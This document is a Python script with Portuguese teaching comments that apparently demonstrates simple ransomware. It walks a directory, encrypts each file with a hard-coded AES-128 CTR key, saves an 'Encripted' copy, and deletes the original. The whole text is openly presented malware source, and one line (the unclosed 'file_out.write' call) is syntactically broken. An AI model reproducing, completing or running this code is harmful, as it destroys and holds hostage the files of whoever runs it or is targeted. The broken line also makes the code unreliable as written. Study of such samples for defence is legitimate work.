# coding=utf-8
import os
import pyaes


directory = '/home/diretorio/ranso/'                 # Escolhemos o Diretório.
list = os.listdir(directory)                     # Usaremos o "os.listdir()" para listar todos os arquivos do diretório.

for files in os.listdir(directory):              # Usando uma estrutura de repetição For para pegar todos os arquivos listados.
  os.chdir(directory)                            # Usamos o "os.chdir()" para que altere o diretório de trabalho atual para path.
  with open(files, 'rb') as c:                   # Dentro do For, usamos essa função para abrir todos os arquivos(files) que foram listados, e 'rb' para Read(r) e Binary(b), ou seja, ler o binário dos arquivos.
    data = c.read()                              # Nesse passo estamos salvando o que foi lido em binário na variável data.
    c.close()                                    # Fechamos os arquivos.
    
  # Criptografia dos arquivos (Using AES)
  key = b"0123456789abcdef"                      # Escolhemos uma chave de 16bytes(128bits), o 'b' na frente indica Bytes.
  aes = pyaes.AESModeOfOperationCTR(key)         # Usaremos a criptografia AES 128bits no modo de operação CTR(Recomendado pela documentação). Dentro dessa função foi passado nossa (key). Ransowares Comerciais costumam usar chaves randômicas, criptografia assimétrica(2 keys), dentro outros.
  crypto_data = aes.encrypt(data)                # Nesse passo, passamos a variável data que contém o conteúdo em binário dos arquivos que foram listados dentro da função para que sejam criptografados. Após isso o conteúdo criptografado será salvo na variável 'crypto_data'.


  new_file = 'Encripted'+os.path.basename(files) # Vamos nomear os arquivos criptografados. Nesse caso, escolhi dar o nome de 'Encripted', concatenado com o nome original do arquivo. A fução 'os.path.basename(files)' irá pegar o nome dos arquivos originais, nesse caso passamos os arquivos(files) como argumento.
  
  # Save Files
  file_out = open(new_file, 'wb')                # A função open irá criar,nomear e abrir um arquivo com o (nome que escolhemos + nome original). O 'wb' significa Write(e) e Binary(b), ou seja, irá escrever em binário dentro de cada arquivo que será criado
  file_out.write(crypto_data                     # Usamos o método '.write()' para escrever e passamos a variável que guarda o conteúdo em binário que está criptografado.
  file_out.close()                               # Usamos a função '.close()' para fechar os arquivos.

  os.remove(files)                               # Usamos o método remove do OS para remover os arquivos que desejamos. Nesse caso, após cada arquivo ser criado com o conteúdo já criptografado será excluído o original.

